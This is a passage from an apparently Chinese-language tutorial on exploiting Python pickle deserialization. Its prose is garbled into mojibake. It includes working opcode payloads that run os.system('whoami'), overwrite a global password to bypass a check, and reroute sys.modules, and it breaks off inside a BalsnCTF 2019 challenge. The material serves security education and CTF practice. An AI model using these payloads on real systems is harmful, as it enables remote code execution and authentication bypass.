escape_">\n</span>csecret<span class="hljs-char escape_">\n</span>pwd<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br></code></pre></td></tr></table></figure></p>
<p>‰∏¢ËøõÂéªÁúãÁúãÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/c51474bf-c23b-4402-9773-bcda53d65405.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>nice</p>
<h4 id="ÂºïÂÖ•È≠îÊúØÊñπÊ≥ï">ÂºïÂÖ•È≠îÊúØÊñπÊ≥ï</h4>
<p>‰∏æ‰∏™ RCE ÁöÑ‰æãÂ≠êÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        ser = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># ËæìÂÖ•ÁÇπ</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;R&quot;</span> <span class="hljs-keyword">in</span> ser:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hack! &lt;=@_@&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            obj = pickle.loads(ser)<br></code></pre></td></tr></table></figure></p>
<p>ÂØπ‰∫éËøô‰∏™‰æãÂ≠êÊù•ËØ¥ÔºåË¶ÅÊÉ≥ RCEÔºåÈúÄË¶ÅËøáËøôÈáåÁöÑ ifÔºå‰πüÂ∞±ÊòØ‰∏çËÉΩÁî® <code>R</code>„ÄÇ</p>
<p>ÂÖàÊù•Áúã‰∏ãÂ∏∏ËßÑÁöÑ payload ÊòØ‰ªÄ‰πàÊ†∑ÁöÑÔºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.<br>                                    ^<br></code></pre></td></tr></table></figure><br />
Ëøô R Â¶Ç‰ΩïÂéªÈô§Âë¢Ôºü<code>b</code> Â∞±Ê¥æ‰∏äÁî®Âú∫‰∫Ü„ÄÇ</p>
<p>ÂõûÈ°æ‰∏Ä‰∏ãÂÆÉÁöÑ‰ΩúÁî®Ôºö‰ΩøÁî®Ê†à‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÔºàÂÇ®Â≠òÂ§ö‰∏™ Â±ûÊÄßÂêç-Â±ûÊÄßÂÄº ÁöÑÂ≠óÂÖ∏ÔºâÂØπÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†ÔºàÂØπË±°ÂÆû‰æãÔºâËøõË°åÂ±ûÊÄß/ÊñπÊ≥ïÁöÑËÆæÁΩÆ„ÄÇÊó¢ÁÑ∂ÂèØ‰ª•ËÆæÁΩÆÂÆû‰æãÁöÑÊñπÊ≥ïÔºåÈÇ£‰πàËÉΩ‰∏çËÉΩËÆæÁΩÆ‰∏Ä‰∏™ÊñπÊ≥ïËÆ©ÂÆÉÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôËá™Âä®ËøêË°åÂë¢Ôºü‰ªÄ‰πàÊñπÊ≥ï‰ºöÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôËá™Âä®ËøêË°åÔºåÁ≠îÊ°àÊòØ‰∏äÈù¢ÊèêÂà∞ÁöÑ <code>__setstate__()</code>„ÄÇ</p>
<p>ÊâÄ‰ª•ÔºåÊàë‰ª¨Âè™ÈúÄË¶Å‰ª§ <code>__setstate__ = os.system</code>ÔºåÂÜçÊääÂèÇÊï∞‰º†ÂÖ•Âç≥ÂèØÔºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dV__setstate__<span class="hljs-symbol">\n</span>cos<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>ubVwhoami<span class="hljs-symbol">\n</span>b.<br></code></pre></td></tr></table></figure></p>
<p>‰ΩÜÊòØÊàë‰ª¨ÊääÊâßË°åÂáΩÊï∞ÁöÑÈÇ£‰∏™ R ÂéªÊéâ‰πãÂêéÔºåÁî±‰∫éË¶ÅÊûÑÂª∫ÂÆû‰æãÔºåÂèàÂºïÂÖ•‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑ R„ÄÇÁî®ÂâçÈù¢ÊèêÂà∞ËøáÁöÑÔºå‰øÆÊîπÂçèËÆÆÁâàÊú¨Âç≥ÂèØÔºö<br />
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">\x80\x02c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.</span><br><span class="hljs-comment"># pickletools.dis Â¶Ç‰∏ã</span><br>    <span class="hljs-attr">0:</span> <span class="hljs-string">c</span>    <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-attr">15:</span> <span class="hljs-string">)</span>    <span class="hljs-string">EMPTY_TUPLE</span><br>   <span class="hljs-attr">16:</span> <span class="hljs-string">\x81</span> <span class="hljs-string">NEWOBJ</span><br>   <span class="hljs-attr">17:</span> <span class="hljs-string">&#125;</span>    <span class="hljs-string">EMPTY_DICT</span><br>   <span class="hljs-attr">18:</span> <span class="hljs-string">(</span>    <span class="hljs-string">MARK</span><br>   <span class="hljs-attr">19:</span> <span class="hljs-string">V</span>        <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;__setstate__&#x27;</span><br>   <span class="hljs-attr">33:</span> <span class="hljs-string">c</span>        <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;os system&#x27;</span><br>   <span class="hljs-attr">44:</span> <span class="hljs-string">u</span>        <span class="hljs-string">SETITEMS</span>   <span class="hljs-string">(MARK</span> <span class="hljs-string">at</span> <span class="hljs-number">18</span><span class="hljs-string">)</span><br>   <span class="hljs-attr">45:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">46:</span> <span class="hljs-string">V</span>    <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;whoami&#x27;</span><br>   <span class="hljs-attr">54:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">55:</span> <span class="hljs-string">.</span>    <span class="hljs-string">STOP</span><br></code></pre></td></tr></table></figure></p>
<p><code>\x80\x02</code> ÊòØÂçèËÆÆÁöÑÁâàÊú¨Â£∞ÊòéÔºåÂèØÂÜôÂèØ‰∏çÂÜôÔºåÂÜôÈîô‰∫Ü‰πü‰∏çÂΩ±Âìç Python ËØÜÂà´Ôºõ<code>\x81</code> ÂÖ∂ÂÆûÂ∞±ÊòØÈÄöËøá <code>cls.__new__</code> Êù•ÂàõÂª∫‰∏Ä‰∏™ÂÆû‰æãÔºåÈúÄË¶ÅÊ†àÈ°∂Êúâ argsÔºàÂÖÉÁªÑÔºâ Âíå kwdsÔºàÂ≠óÂÖ∏Ôºâ„ÄÇ</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6397d745-ca0b-48ed-a2ee-73b89b8766e5.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h4 id="find_class-ÈªëÂêçÂçïÁªïËøá">find_class ÈªëÂêçÂçïÁªïËøá</h4>
<p>Python ÁöÑÂÆòÊñπÊñáÊ°£ÈáåÔºåÊòéÁ°ÆË°®Á§∫‰∫Ü pickle ÊòØ‰∏ç‰øùËØÅÂÆâÂÖ®ÊÄßÁöÑÔºåÊâÄ‰ª•Êï∞ÊçÆ‰∏ÄÂÆöË¶ÅÂèØ‰ø°ÊâçËÉΩËøõË°å unpickle</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/bc66e3be-c891-4c13-ba24-a1db7cc29ecf.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÂêåÊó∂Ôºå‰πüÁªôÂá∫‰∫ÜÂÆâÂÖ®‰ΩøÁî® pickle ÁöÑÊúÄ‰Ω≥ÂÆûË∑µÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7951335-6080-420d-a558-544c50aa2f2d.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÂΩìÂ∫èÂàóÂåñ‰∏≠ opcode Âá∫Áé∞ <code>c</code>„ÄÅ<code>i</code>„ÄÅ<code>b'\x93'</code> Êó∂Ôºå‰ºöË∞ÉÁî® find_class„ÄÇÂà©Áî®ÁôΩÂêçÂçïÊñπÊ≥ïÊù•ÈôêÂà∂Ëß£Â∞ÅÁöÑÂØπË±°‰∏ÄËà¨ÊòØÊ≤°ÈóÆÈ¢òÁöÑ„ÄÇ‰ΩÜÊòØÂ¶ÇÊûúÁî®ÈªëÂêçÂçïÔºåÂ∞±ÂÆπÊòìÂá∫Áé∞ÁñèÊºèÔºåÊîªÂáªÁöÑÊÄùË∑ØÂ∞±ÊòØÁî® mro Êù•Â±ÇÂ±ÇÊ∑±ÂÖ•ÂØªÊâæÈªëÂêçÂçï‰ª•Â§ñÁöÑÊ®°Âùó„ÄÅÊñπÊ≥ïÔºå‰∏éÊàë‰πãÂâçÂÜôÁöÑ„ÄäPython Ê≤ôÁÆ±ÈÄÉÈÄ∏ÁöÑÁªèÈ™åÊÄªÁªì„ÄãÔºàËßÅËµÑÊñô 1ÔºâÈáåÊèêÂà∞ÁöÑÊäÄÂ∑ßÂ¶ÇÂá∫‰∏ÄËæôÔºåÊàëËøôÈáåÂ∞±‰∏çÂï∞Âó¶‰∫Ü„ÄÇ</p>
<p>Â¶ÇÊûú‰Ω†ÁªèÂ∏∏Êâì CTFÔºåÂ∞±‰ºöÂèëÁé∞Áé∞Âú® Python ÂèçÂ∫èÂàóÂåñÁöÑÈ¢òÁõÆÂü∫Êú¨‰∏äÈÉΩË¶ÅÁî®Âà∞ find_classÔºåÂêéÈù¢‰ºöÊúâ‰∏Ä‰∫õÁªèÂÖ∏ÁöÑÈ¢òÁõÆ„ÄÇ‰Ωú‰∏∫È¢òÁõÆÈöæÂ∫¶ÊéßÂà∂Âô®ÔºåÈúÄË¶ÅÂíåÂÖ∂‰ªñÂú∫ÊôØËÅîÂêàËµ∑Êù•ÂéªÁúãÂ¶Ç‰ΩïÁªïËøáÔºåÊâÄ‰ª•ÊàëËøôÈáåÂ∞±‰∏çÂçïÁã¨‰∏æ‰æãËØ¥Êòé‰∫Ü„ÄÇ</p>
<h4 id="ÂèòÈáè‰∏éÊñπÊ≥ïË¶ÜÁõñ">ÂèòÈáè‰∏éÊñπÊ≥ïË¶ÜÁõñ</h4>
<p>‰∏æ‰∏™‰æãÂ≠êÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">PWD = <span class="hljs-string">&quot;???&quot;</span>  <span class="hljs-comment"># Â∑≤ÊâìÁ†Å</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># ËæìÂÖ•ÁÇπ</span><br>        <span class="hljs-keyword">if</span> obj.pwd == PWD:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>Ëøô‰∏™Êó∂ÂÄôÔºåÂèØ‰ª•ÈÄöËøá import <code>builtins</code> Êù•Ë¶ÜÁõñ <code>globals</code> ÈáåÁöÑ <code>PWD</code>ÔºåËΩ¨Êàê‰ª£Á†ÅÂ∞±ÊòØËøôÊ†∑Ôºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><br>builtins.<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&quot;PWD&quot;</span>] = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># ÂÖàÊää PWD ÊîπÊàê‰∏Ä‰∏™ÂÄº</span><br><br>obj.pwd = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># ÂÜçËÆ© obj.pwd ‰πüÁ≠â‰∫éËøô‰∏™ÂÄº</span><br></code></pre></td></tr></table></figure></p>
<p>ËΩ¨Êàê opcode Â∞±ÊòØÔºö<code>cbuiltins\nglobals\n(tR(VPWD\nVtr0y\nu.</code>Ôºå‰ΩÜÊòØËøòÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÊ≠§Êó∂ obj ÂÆûÈôÖ‰∏äÊòØÂ≠óÂÖ∏ÔºåÂÆÉÂπ∂Ê≤°Êúâ pwd Ëøô‰∏™Â±ûÊÄßÔºåÊâÄ‰ª•Âú® if Âà§Êñ≠ÁöÑÊó∂ÂÄôÂ∞±‰ºöÁõ¥Êé•Êä•Èîô„ÄÇ</p>
<p>Ëß£ÂÜ≥ÁöÑÂäûÊ≥ïÂ∞±ÊòØÁî® <code>0</code> ÊääÊ†àÈáåÁöÑ <code>builtins.globals()</code> ÂºπÂá∫ÔºåÂÆÉÂ∑≤ÁªèÂÆåÊàê‰∫ÜËá™Â∑±‰øÆÊîπ PWD ÂÄºÁöÑ‰ΩøÂëΩÔºõÁÑ∂ÂêéÂÜçÂéãÂÖ•‰∏Ä‰∏™ Target ÂÆû‰æãÔºåÂπ∂ËÆ©ÂÆÉÁöÑ pwd Â±ûÊÄßÁ≠â‰∫é tr0yÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ËÆ© <code>obj.pwd</code> ÁöÑÂÄº‰∏é PWD ‰∏ÄËá¥Ôºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u0c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>)\x81&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br>                                      ^<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/718dacd3-1f33-4952-ab51-94eb585e786c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ËøôÈáå‰Ω†ÂèØËÉΩ‰ºöÊÉ≥Ôºå<code>builtins.globals()</code> ÊòØÂ≠óÂÖ∏ÔºåËÄå Python ‰∏≠‰∏ÄÂàáÁöÜÂØπË±°ÔºåÈÇ£‰πàËøô‰∏™Â≠óÂÖ∏‰πüÊòØ‰∏Ä‰∏™ÂÆû‰æãÔºåËøôÊ†∑Â≤Ç‰∏çÊòØ‰πüÂèØ‰ª•Áî® <code>b</code> Êù•ÁªôËøô‰∏™Â≠óÂÖ∏Êñ∞Â¢û‰∏Ä‰∏™Â±ûÊÄßÔºüËøôÊ†∑ payload Â∞±ÁÆÄÊ¥ÅÂæóÂ§öÔºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br></code></pre></td></tr></table></figure><br />
ÈÅóÊÜæÁöÑÊòØÔºåÂâçÈù¢ÊèêÂà∞ËøáÔºå<code>b</code> ÊòØÊâßË°å <code>__dict__.update()</code>ÔºåËÄåÂ≠óÂÖ∏ÊòØÊ≤°Êúâ <code>__dict__</code> Ëøô‰∏™Â±ûÊÄßÁöÑÔºåÊâÄ‰ª•Ê≤°Ê≥ïÈÄöËøá b ÁªôÂÆÉÊñ∞Â¢û‰∏Ä‰∏™Â±ûÊÄßÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/4ba4c6a5-8e35-46df-8f21-f418b2661b8c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÂΩìÁÑ∂Ôºå‰∏ç‰ªÖÂèòÈáèÂèØ‰ª•Ë¢´Ë¶ÜÁõñÔºåÊñπÊ≥ï‰πüÊòØÂèØ‰ª•Ë¢´Ë¶ÜÁõñÁöÑ„ÄÇÊØîÂ¶Ç <code>sys.modules.get("os")</code>ÔºåÂèØ‰ª•ÂÖàÁî®‰ª£Á†ÅÁêÜÊ∏ÖÊ•öÈìæË∑ØÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>p0 = sys.modules<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = p0<br><span class="hljs-keyword">import</span> sys<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = sys.get(<span class="hljs-string">&quot;os&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>ËΩ¨Êàê opcodeÔºö<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/fe49557c-a78c-4dd7-a61e-3b29ba0ca6f0.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>Ê≥®ÊÑèËøôÈáåÁöÑ import ‰∫Ü‰∏§Ê¨°ÔºåÂè™ÊúâÁ¨¨‰∏ÄÊ¨°ÊòØÁúüÊ≠£ÊâßË°å‰∫Ü sys Ê®°ÂùóÔºåÁÑ∂ÂêéËΩΩÂÖ•ÂÜÖÂ≠òÔºåÁ¨¨‰∫åÊ¨°ÊòØ‰ªé sys.modules Áõ¥Êé•ÂºïÂÖ•ÁöÑ„ÄÇËøô‰∏™ÁâπÊÄß‰∏é Python import ÂçèËÆÆÊúâÂÖ≥Á≥ªÔºåÂÆÉÁî±‰∏§‰∏™Ê®°ÂùóÊûÑÊàêÔºåÊü•ÊâæÂô®ÂíåÂä†ËΩΩÂô®„ÄÇÂØºÂÖ•ËØ¶ÁªÜÊú∫Âà∂ÂèØÁúãËµÑÊñô 5„ÄÇ</p>
<p>ÊâÄ‰ª•ÔºåËøô‰∏™ÊÄùË∑ØË¶ÅÊ±ÇÂØπ Python ÂÜÖÁΩÆÁöÑ‰∏Ä‰∫õÂ±ûÊÄß„ÄÅÊñπÊ≥ï„ÄÅÊ®°ÂùóÊúâÊâéÂÆûÁöÑÊéåÊè°„ÄÇÊØîÂ¶ÇÊåâÁÖß Python ÊñáÊ°£ÁöÑÊÑèÊÄùÊù•ÁúãÔºåÂ±ûÊÄßÂåÖÊã¨ <code>Êï∞ÊçÆÂ±ûÊÄß</code> Âíå <code>ÊñπÊ≥ï</code>ÔºåÊâÄ‰ª•‰∏•Ê†ºÊù•ËØ¥ÔºåÊàë‰ª¨Â∏∏ËØ¥ÁöÑ<code>Â±ûÊÄß</code>‰∏ÄËØçÔºåÂÖ∂ÂÆûÁâπÊåá <code>Êï∞ÊçÆÂ±ûÊÄß</code>ÔºàËøô‰∏ÄÁÇπÊ≤°ÂøÖË¶ÅÂ§™Á∫†ÁªìÔºåÂèçÊ≠£Â§ßÂÆ∂ÈÉΩÊòØËøô‰πàËØ¥ÁöÑÔºâ„ÄÇËøòÊúâÔºåÂ§ßÂÆ∂ÂèØËÉΩ‰π†ÊÉØÊÄßÁî® <code>dir()</code> Êù•Êü•ÁúãÂ±ûÊÄßÂíåÊñπÊ≥ïÔºåÂÖ∂ÂÆûÂÆÉÂú®ÂèÇÊï∞‰∏çÂêåÁöÑÊó∂ÂÄôÔºåÊü•ËØ¢ÁöÑÈÄªËæëÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/98a6e69c-927e-4960-ae87-e92636533d13.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>Êàë‰∏ÄËà¨ÊòØÂú® ipython ‰∏≠Áî® <code>.*?</code> Êù•Êü•ÁúãÔºå‰æãÂ¶Ç <code>os.*?</code>ÔºåËøô‰∏™ÁªìÊûúÊòØÈùûÂ∏∏ÂÖ®ÁöÑ„ÄÇ</p>
<p>Âè¶Â§ñÁâπÂà´Ê≥®ÊÑèÁöÑÊòØÔºåÊúâ‰∫õÂØπË±°ÁöÑ <code>__dict__</code> Â±û‰∫é <code>mappingproxy</code> Á±ªÂûãÔºå‰æãÂ¶ÇÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/37e7cf49-b026-40ee-990b-1f670522f221.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>Â¶ÇÊûúÁõ¥Êé•Áî® <code>b</code> ËøôÁßçÂØπË±°ËøõË°åÂ±ûÊÄß‰øÆÊîπÁöÑËØùÔºå‰ºöÊäõÂá∫ÂºÇÂ∏∏Ôºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/7b7667a1-0feb-469e-b0b5-e83d084cfa38.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>Êü•Áúã pickle ÁöÑÊ∫êÁ†ÅÔºàËßÅËµÑÊñô 6ÔºâÂèØÁü•ÔºàÊ≥®Ôºöpickle Ê∫êÁ†Å‰∏≠Êúâ <code>_pickle</code>ÔºàÂç≥ cPickleÔºâ‰ºòÂÖà‰ΩøÁî®ÁöÑÈÄªËæëÔºåÂ¶ÇÊûúËøô‰∏™Ê®°ÂùóÂØºÂÖ•Â§±Ë¥•ÔºåÊâç‰ºö‰ΩøÁî®Ëøô‰∏äÈù¢ÁöÑ pickle„ÄÇËøô‰∏§‰∏™Ê®°ÂùóÁöÑÈÄªËæëÁï•ÊúâÂ∑ÆÂºÇÔºåÂ¶ÇÊûúÊÉ≥‰ªîÁªÜÂØπÊØîÈúÄË¶ÅÁúã‰∏ã <code>_pickle</code> ÁöÑ C Ê∫êÁ†ÅÔºâÔºåÊúÄÁªà‰ºöÊâßË°å <code>inst_dict[intern(k)] = v</code>ÔºåËÄå mappingproxy Á±ªÂûãÁ¶ÅÊ≠¢ËøôÊ†∑Êìç‰ΩúÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b657bcaf-d4ba-4e2a-a317-06cd0002cf17.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÈÇ£‰πàÂ∫îËØ•ÊÄé‰πàÂäûÂë¢ÔºüÂÜçÁúãÊ∫êÁ†ÅÔºåÂ¶ÇÊûú <code>state</code> ÊòØ‰∏§‰∏™ÂÖÉÁ¥†ÁöÑÂÖÉÁªÑÔºåÈÇ£‰πà‰ºöÊâßË°å <code>state, slotstate = state</code>ÔºåÂ¶ÇÊûúÊ≠§Êó∂ <code>state in [None, &#123;&#125;]</code>ÔºàÁî±‰∫é <code>_pickle</code> ÈÄªËæëÈóÆÈ¢òÔºåÊòØÊ≤°ÂäûÊ≥ïËÆ© state Á≠â‰∫é <code>''</code>„ÄÅ<code>0</code> Á≠âËøôÁßçÂÄºÁöÑÔºâÔºåÈÇ£‰πàÂ∞±‰ºöË∑ëÂéªÊâßË°å <code>setattr(inst, k, v)</code>ÔºåËøôÊòØ mappingproxy Á±ªÂûãÂÖÅËÆ∏ÁöÑÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/ee98ebcb-fb16-4fc0-9436-d18b86626b6c.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÊâÄ‰ª•ÔºåÂÅáÂ¶ÇÊúâ‰∏Ä‰∏™Â∫ìÊòØ AÔºåÈáåÈù¢Êúâ‰∏™Á±ª bÔºåË¶Å‰øÆÊîπ b ÁöÑÂ±ûÊÄßÔºåÂéüÊú¨Ë¶ÅÊâßË°åÁöÑ <code>cA\nb\n&#125;Va\nI1\nsb.</code> Â∫îËØ•Êîπ‰∏∫ <code>cA\nb\n(N&#125;Va\nI1\ntsb.</code> ÊàñËÄÖ <code>cA\nb\n(&#125;&#125;Va\nI1\ntsb.</code></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/3d00a59a-bb3c-4c71-93ee-e7eb1a7719c8.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h2 id="ËØæÂêéÈ¢ò">ËØæÂêéÈ¢ò</h2>
<p>Ëøô‰∏âÈÅìÈ¢òÁõÆÊòØ 2019 Âπ¥ÁöÑ BalsnCTFÔºåÈùûÂ∏∏ÁªèÂÖ∏ÁöÑ Python ÂèçÂ∫èÂàóÂåñÈ¢òÔºåÊ∫êÁ†ÅËßÅËµÑÊñô 7</p>
<h3 id="pyshv1">pyshv1</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> 